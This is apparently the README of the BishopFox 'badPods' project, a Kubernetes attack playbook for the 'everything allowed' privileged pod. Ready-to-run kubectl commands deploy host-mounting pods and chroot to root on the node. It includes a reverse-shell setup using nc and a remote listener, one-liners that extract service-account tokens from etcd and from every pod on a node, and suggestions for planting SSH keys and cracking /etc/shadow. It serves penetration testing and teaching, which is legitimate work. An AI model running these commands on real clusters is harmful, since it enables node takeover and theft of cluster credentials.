# Bad Pod #1: Everything allowed

## Table of Contents
* [Pod creation & access](#Pod-Creation-&-Access)
   * [Exec pods](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
   * [Reverse shell pods](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
   * [Deleting resources](#Deleting-Resources)
* [Post exploitation](#Post-exploitation)
   * [Look for kubeconfig's in the host filesystem](#Look-for-kubeconfigs-in-the-host-filesystem) 
   * [Grab all tokens from all pods on the system](#Grab-all-tokens-from-all-pods-on-the-system)
   * [Some other ideas](#Some-other-ideas)
   * [Attacks that apply to all pods, even without any special permissions](#Attacks-that-apply-to-all-pods-even-without-any-special-permissions)
* [Demonstrate impact](#Demonstrate-impact)
* [References](#References)

# Pod creation & access

## Exec pods
Create one or more of these resource types and exec into the pod

**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
```
**Job**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-exec-job.yaml 
kubectl get pods | grep everything-allowed-exec-job      
kubectl exec -it everything-allowed-exec-job-[ID] -- chroot /host bash
```
**CronJob**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-exec-cronjob.yaml 
kubectl get pods | grep everything-allowed-exec-cronjob      
kubectl exec -it everything-allowed-exec-cronjob-ID -- chroot /host bash
```
**Deployment**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-exec-deployment.yaml 
kubectl get pods | grep everything-allowed-exec-deployment        
kubectl exec -it everything-allowed-exec-deployment-[ID] -- chroot /host bash
```
**StatefulSet (This manifest also creates a service)**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/statefulset/everything-allowed-exec-statefulset.yaml
kubectl get pods | grep everything-allowed-exec-statefulset
kubectl exec -it everything-allowed-exec-statefulset-[ID] -- chroot /host bash
```
**ReplicaSet**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-exec-replicaset.yaml
kubectl get pods | grep everything-allowed-exec-replicaset
kubectl exec -it everything-allowed-exec-replicaset-[ID] -- chroot /host bash

```
**ReplicationController**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-exec-replicationcontroller.yaml
kubectl get pods | grep everything-allowed-exec-replicationcontroller
kubectl exec -it everything-allowed-exec-replicationcontroller-[ID] -- chroot /host bash
```
**DaemonSet**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/daemonset/everything-allowed-exec-daemonset.yaml 
kubectl get pods | grep everything-allowed-exec-daemonset
kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
```

## Reverse shell pods
Create one or more of these resources and catch reverse shell

**Generic resource type creation example***
Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 

**Step 1: Set up listener**
```bash
nc -nvlp 3116
```

**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
```

**Step 3: Catch the shell and chroot to /host**
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
# chroot /host
```

## Deleting resources
You can delete a resource using it's manifest, or by name. Here are some examples: 
```
kubectl delete [type] [resourcename]
kubectl delete -f manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl delete pod everything-allowed-exec-pod
kubectl delete cronjob everything-allowed-exec-cronjob
```

# Post exploitation

The pod has you created mounts the host’s filesystem to the pod, and gives you access to all of the host's namespaces and capabilites. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 



## Can you run your pod on a control-plane node
The pod you created above was likely scheduled on a worker node. Before jumping into post exploitation on the worker node, it is worth seeing if you run your a pod on a control-plane node. If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. This is not a possible on cloud managed Kuberntes clusters like GKE and EKS - they hide the control-plane. 

Get nodes
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

Pick your manifest, uncomment and update the nodeName field with the naame of the master node
```
nodeName: k8s-control-plane
```
Create your pod
```
kubectl apply -f manifests/everything-allowed/job/everything-allowed-exec-job.yaml
```

TODO - show how to get secrets from etcd

## Read secrets from etcd
If you can run your pod on a control-plane node using the `nodeName` selector in the pod spec, you might have easy access to the `etcd` database, which contains all of the configuration for the cluster, including all secrets. 

Below is a quick and dirty way to grab secrets from `etcd` if it is running on the control-plane node you are on. If you want a more elegent solution that spins up a pod with the `etcd` client utility `etcdctl` and uses the control-plane node's credentials to connect to etcd wherever it is running, check out [this example manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) from @mauilion. 

**Check to see if `etcd` is running on the control-plane node and see where the database is (This is on a `kubeadm` created cluster)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
Output:
```
data-dir=/var/lib/etcd
```
**View the data in etcd database:**
```
strings /var/lib/etcd/member/snap/db | less
```

**Extract the tokens from the database and show the service account name**
```
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**Same command, but some greps to only return the default token in the kube-system namespace**
```
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
Output:
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```


## Look for kubeconfig's in the host filesystem 

By default, nodes don't have `kubectl` installed. If you are lucky though, an administrator tried to make their life (and yours) a little easier by installing `kubectl` and their highly privleged credentails on the node. We're not so lucky on this GKE node 

**Some ideas:**
```bash
find / -name kubeconfig
find / -name .kube
grep -R "current-context" /home/
grep -R "current-context" /root/
```

## Grab all tokens from all pods on the system
You can access any secret mounted within any pod on the node you are on. In a production cluster, even on a worker node, there is usually at least one pod that has a mounted *token* that is bound to a *service account* that is bound to a *clusterrolebinding*, that gives you access to do things like create pods or view secrets in all namespaces. 

Look for tokens that have permissions to get secrets in kube-system. The examples below automate this process for you a bit:

### Run kubectl can-i --list against ALL tokens found on the node :)
```
tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list; echo; done
```

### Run kubectl can-i --list -n kube-system against ALL tokens found on the node :)
```
tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; for filename in $tokens; do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; echo "Token Location: $filename_clean"; tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host cat $filename_clean`; echo -n "What can I do? "; kubectl --token=$tokena auth can-i --list -n kube-system; echo; done
```

### Just list the namespace and location of every token
```bash
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
```

**Can any of the tokens:**
* Create a pod, deployment, etc. in the kube-system namespace?
* Create a role in the kube-system namsspace?
* View secrets in the kube-system namespace?
* Create clusterrolebindings? 

Your goal is to find a way to get access to all resources in all namspaces.


## Some other ideas:
* Add your public key authorized_keys on the node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 

## Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 

   
# Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
  
